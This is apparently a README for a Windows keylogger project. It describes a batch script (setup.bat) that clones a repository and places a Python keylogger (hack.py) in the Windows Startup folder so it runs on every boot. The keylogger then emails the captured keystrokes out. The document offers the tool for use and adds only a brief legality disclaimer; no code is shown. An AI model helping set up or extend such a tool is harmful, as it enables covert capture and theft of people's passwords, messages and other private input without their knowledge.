Windows Keylogger Setup Script
This Windows batch script automates the process of setting up a keylogger by adding a Python script to the Windows Startup folder. The Python script (hack.py) logs keystrokes and sends them via email.

Features
Automates the setup process for deploying a keylogger
Clones the keylogger script from a specified GitHub repository
Adds the keylogger script to the Windows Startup folder for persistent execution
Logs keystrokes and sends them via email

Requirements --
Windows operating system
Git installed and added to PATH
Python 3.x installed

Run the script:

Double-click the batch script file (setup.bat) to execute it.
Alternatively, run the script from the command line:
"setup.bat"
The script will clone the specified GitHub repository into a temporary directory, copy the Python keylogger script to the Windows Startup folder, and clean up the temporary directory.

Upon system restart, the keylogger script will start automatically, logging keystrokes and sending them via email.

Important Note
Security: Exercise caution when using this tool, as keyloggers can be considered malicious software. Ensure you have appropriate permissions to monitor keyboard input, and use it responsibly and legally.



